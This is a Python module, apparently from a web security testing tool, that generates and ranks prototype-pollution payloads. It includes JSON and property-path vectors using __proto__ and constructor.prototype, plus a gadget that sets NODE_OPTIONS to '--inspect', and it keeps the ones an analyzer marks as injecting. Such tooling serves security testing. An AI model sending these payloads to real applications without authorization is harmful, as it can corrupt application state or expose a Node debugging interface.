"""Prototype-pollution payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_prototype_context

# JSON body / value vectors.
_JSON_BODIES = [
    ('{"__proto__": {"polluted": true}}', "proto-json"),
    ('{"constructor": {"prototype": {"polluted": true}}}', "constructor-chain"),
    ('{"__proto__": {"NODE_OPTIONS": "--inspect"}}', "gadget"),
]

# Property-path vectors (bracket / dot notation).
_PATH_BODIES = [
    ("__proto__[polluted]=1", "proto-bracket"),
    ("__proto__.polluted=1", "proto-dot"),
    ("constructor[prototype][polluted]=1", "constructor-bracket"),
    ("__proto__[NODE_OPTIONS]=--inspect", "gadget"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class PrototypeCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class PrototypeMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[PrototypeCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.PP_PATH:
        return _PATH_BODIES
    return _JSON_BODIES


def mutate_prototype(template: str) -> PrototypeMutationResult:
    """Generate and rank prototype-pollution payloads for ``template``."""
    from .analyzer import analyze_prototype

    context = analyze_prototype_context(template)
    generated = _bodies(context)

    candidates: list[PrototypeCandidate] = []
    for payload, strategy in generated:
        result = analyze_prototype(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                PrototypeCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return PrototypeMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
